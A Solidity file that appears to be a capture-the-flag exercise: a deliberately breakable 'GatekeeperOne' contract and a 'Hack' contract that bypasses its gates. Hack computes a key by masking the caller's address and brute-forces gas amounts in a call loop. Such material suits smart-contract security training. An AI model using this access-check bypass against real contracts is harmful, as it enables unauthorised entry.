// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Hack {
    function getKey() external view returns (bytes8) {
        return bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF);
    }

    // 0x1000000000000000
    function hack(address target, bytes8 key) external {
        for (uint16 i = 0; i < 500; i++) {
            (bool success, ) = target.call{gas: i + 8191 * 3}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                return;
            }
        }
    }
}
